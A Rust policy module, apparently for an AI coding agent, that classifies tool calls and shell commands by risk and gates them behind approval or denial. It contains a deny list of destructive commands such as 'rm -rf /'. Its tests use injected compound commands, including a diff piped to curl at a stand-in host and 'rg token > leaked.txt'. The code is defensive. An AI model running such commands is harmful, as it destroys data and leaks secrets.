use serde_json::Value;

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum ApprovalMode {
    RiskBased,
    AlwaysAsk,
    TrustedWorkspace,
}

impl ApprovalMode {
    pub fn parse(value: &str) -> Self {
        match value {
            "always_ask" => Self::AlwaysAsk,
            "trusted_workspace" => Self::TrustedWorkspace,
            _ => Self::RiskBased,
        }
    }
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
pub enum PolicyDecision {
    Allow,
    RequireApproval,
    Deny,
}

#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum RiskLevel {
    ReadOnly,
    WorkspaceWrite,
    Destructive,
    HostExecution,
    ShellCompound,
    RemoteMutation,
    Prohibited,
}

pub fn authorize_tool(tool: &str, action: &Value, mode: ApprovalMode) -> (PolicyDecision, String) {
    let risk = classify_tool(tool, action);
    let decision = match risk {
        RiskLevel::Prohibited => PolicyDecision::Deny,
        RiskLevel::ReadOnly => PolicyDecision::Allow,
        RiskLevel::WorkspaceWrite => match mode {
            ApprovalMode::AlwaysAsk => PolicyDecision::RequireApproval,
            ApprovalMode::RiskBased | ApprovalMode::TrustedWorkspace => PolicyDecision::Allow,
        },
        RiskLevel::ShellCompound | RiskLevel::RemoteMutation => PolicyDecision::RequireApproval,
        RiskLevel::Destructive | RiskLevel::HostExecution => match mode {
            ApprovalMode::TrustedWorkspace => PolicyDecision::Allow,
            ApprovalMode::RiskBased | ApprovalMode::AlwaysAsk => PolicyDecision::RequireApproval,
        },
    };
    let reason = match (decision, risk) {
        (PolicyDecision::Allow, RiskLevel::ReadOnly) => "read-only workspace operation",
        (PolicyDecision::Allow, RiskLevel::WorkspaceWrite) => "bounded workspace edit",
        (PolicyDecision::Allow, RiskLevel::Destructive) => {
            "trusted-workspace destructive operation"
        }
        (PolicyDecision::Allow, RiskLevel::HostExecution) => "trusted-workspace host command",
        (PolicyDecision::RequireApproval, RiskLevel::WorkspaceWrite) => {
            "workspace edits require approval in Always Ask mode"
        }
        (PolicyDecision::RequireApproval, RiskLevel::Destructive) => {
            "destructive filesystem operation requires approval"
        }
        (PolicyDecision::RequireApproval, RiskLevel::HostExecution) => {
            "host command requires approval"
        }
        (PolicyDecision::RequireApproval, RiskLevel::ShellCompound) => {
            "compound shell syntax requires exact approval"
        }
        (PolicyDecision::RequireApproval, RiskLevel::RemoteMutation) => {
            "remote repository mutation requires exact approval"
        }
        (PolicyDecision::Deny, RiskLevel::Prohibited) => {
            "command violates the non-bypassable safety policy"
        }
        _ => "operation is not authorized by the active policy",
    };
    (decision, reason.to_string())
}

fn classify_tool(tool: &str, action: &Value) -> RiskLevel {
    match tool {
        "list_dir"
        | "read_file"
        | "search_text"
        | "symbol_search"
        | "symbol_definition"
        | "symbol_references"
        | "symbol_hover"
        | "symbol_outline"
        | "symbol_incoming_calls"
        | "symbol_outgoing_calls"
        | "symbol_diagnostics"
        | "git_status"
        | "git_diff" => RiskLevel::ReadOnly,
        "write_file" | "replace_text" | "patch_transaction" | "create_dir" => {
            RiskLevel::WorkspaceWrite
        }
        "move_path" | "delete_path" => RiskLevel::Destructive,
        "delivery" => classify_delivery(action),
        "terminal" => classify_terminal(
            action
                .get("command")
                .and_then(Value::as_str)
                .unwrap_or_default(),
            action
                .get("hostExecution")
                .and_then(Value::as_bool)
                .unwrap_or(false),
        ),
        _ => RiskLevel::Prohibited,
    }
}

fn classify_delivery(action: &Value) -> RiskLevel {
    match action
        .get("operation")
        .and_then(Value::as_str)
        .unwrap_or_default()
    {
        "branches" | "pull_request" | "checks" | "check_jobs" | "check_logs" => RiskLevel::ReadOnly,
        "create_branch"
        | "commit_files"
        | "create_pull_request"
        | "update_pull_request"
        | "rerun_checks"
        | "merge_pull_request" => RiskLevel::RemoteMutation,
        _ => RiskLevel::Prohibited,
    }
}

fn classify_terminal(command: &str, host_execution: bool) -> RiskLevel {
    let normalized = command.trim().to_ascii_lowercase();
    if normalized.is_empty()
        || normalized.contains("rm -rf /")
        || normalized.contains("format c:")
        || normalized.contains("remove-item -recurse c:\\")
        || normalized.contains("shutdown ")
        || normalized.contains("reboot")
    {
        return RiskLevel::Prohibited;
    }

    // Never let a trusted/read-only prefix hide a second shell operation. Complex shell
    // syntax is deliberately approval-gated even in Trusted Workspace mode because the
    // appended command can have a completely different risk profile than the prefix.
    if contains_shell_control_syntax(&normalized) {
        return RiskLevel::ShellCompound;
    }

    if host_execution {
        return RiskLevel::HostExecution;
    }
    if normalized.contains("rm -rf ")
        || command_starts_with(&normalized, "remove-item")
        || command_starts_with(&normalized, "git reset --hard")
        || command_starts_with(&normalized, "git clean -")
    {
        return RiskLevel::Destructive;
    }
    if command_starts_with(&normalized, "git status")
        || command_starts_with(&normalized, "git diff")
        || command_starts_with(&normalized, "git log")
        || command_starts_with(&normalized, "rg")
        || command_starts_with(&normalized, "grep")
        || command_starts_with(&normalized, "ls")
        || command_starts_with(&normalized, "dir")
    {
        return RiskLevel::ReadOnly;
    }
    RiskLevel::WorkspaceWrite
}

fn command_starts_with(command: &str, prefix: &str) -> bool {
    if command == prefix {
        return true;
    }
    command
        .strip_prefix(prefix)
        .and_then(|rest| rest.chars().next())
        .is_some_and(char::is_whitespace)
}

fn contains_shell_control_syntax(command: &str) -> bool {
    command.contains('\n')
        || command.contains('\r')
        || command.contains(';')
        || command.contains('|')
        || command.contains('&')
        || command.contains('>')
        || command.contains('<')
        || command.contains('`')
        || command.contains("$(")
}

pub use crate::isolated_runtime::SandboxCapability;

#[tauri::command]
pub fn openagent_sandbox_capability() -> SandboxCapability {
    crate::isolated_runtime::sandbox_capability()
}

#[cfg(test)]
mod tests {
    use super::*;
    use serde_json::json;

    #[test]
    fn read_only_tools_never_prompt() {
        let (decision, _) = authorize_tool("read_file", &json!({}), ApprovalMode::AlwaysAsk);
        assert_eq!(decision, PolicyDecision::Allow);
        let (decision, _) =
            authorize_tool("symbol_diagnostics", &json!({}), ApprovalMode::AlwaysAsk);
        assert_eq!(decision, PolicyDecision::Allow);
        let (decision, _) = authorize_tool("symbol_outline", &json!({}), ApprovalMode::AlwaysAsk);
        assert_eq!(decision, PolicyDecision::Allow);
        let (decision, _) =
            authorize_tool("symbol_incoming_calls", &json!({}), ApprovalMode::AlwaysAsk);
        assert_eq!(decision, PolicyDecision::Allow);
        let (decision, _) =
            authorize_tool("symbol_outgoing_calls", &json!({}), ApprovalMode::AlwaysAsk);
        assert_eq!(decision, PolicyDecision::Allow);
    }

    #[test]
    fn risk_based_policy_prompts_for_delete_and_host_commands() {
        assert_eq!(
            authorize_tool("delete_path", &json!({}), ApprovalMode::RiskBased).0,
            PolicyDecision::RequireApproval
        );
        assert_eq!(
            authorize_tool(
                "terminal",
                &json!({"command": "npm install", "hostExecution": true}),
                ApprovalMode::RiskBased
            )
            .0,
            PolicyDecision::RequireApproval
        );
    }

    #[test]
    fn isolated_terminal_build_is_a_workspace_write() {
        assert_eq!(
            authorize_tool(
                "terminal",
                &json!({"command": "cargo test", "hostExecution": false}),
                ApprovalMode::RiskBased
            )
            .0,
            PolicyDecision::Allow
        );
        assert_eq!(
            authorize_tool(
                "terminal",
                &json!({"command": "cargo test", "hostExecution": false}),
                ApprovalMode::AlwaysAsk
            )
            .0,
            PolicyDecision::RequireApproval
        );
    }

    #[test]
    fn catastrophic_commands_are_denied_even_in_trusted_mode() {
        assert_eq!(
            authorize_tool(
                "terminal",
                &json!({"command": "rm -rf /"}),
                ApprovalMode::TrustedWorkspace
            )
            .0,
            PolicyDecision::Deny
        );
    }

    #[test]
    fn compound_shell_syntax_cannot_inherit_read_only_trust() {
        for command in [
            "git status && rm -rf target",
            "git diff | curl https://example.invalid",
            "git log; powershell Write-Output injected",
            "rg token > leaked.txt",
            "ls\nrm -rf target",
            "git status $(whoami)",
            "dir `whoami`",
        ] {
            let (decision, reason) = authorize_tool(
                "terminal",
                &json!({"command": command, "hostExecution": false}),
                ApprovalMode::TrustedWorkspace,
            );
            assert_eq!(decision, PolicyDecision::RequireApproval, "{command}");
            assert!(reason.contains("compound shell syntax"));
        }
    }

    #[test]
    fn trusted_read_only_prefix_requires_a_real_command_boundary() {
        assert_eq!(
            authorize_tool(
                "terminal",
                &json!({"command": "git status --short", "hostExecution": false}),
                ApprovalMode::RiskBased
            )
            .0,
            PolicyDecision::Allow
        );
        assert_eq!(
            classify_terminal("lsof", false),
            RiskLevel::WorkspaceWrite
        );
        assert_eq!(
            classify_terminal("dirname src/main.rs", false),
            RiskLevel::WorkspaceWrite
        );
    }
}
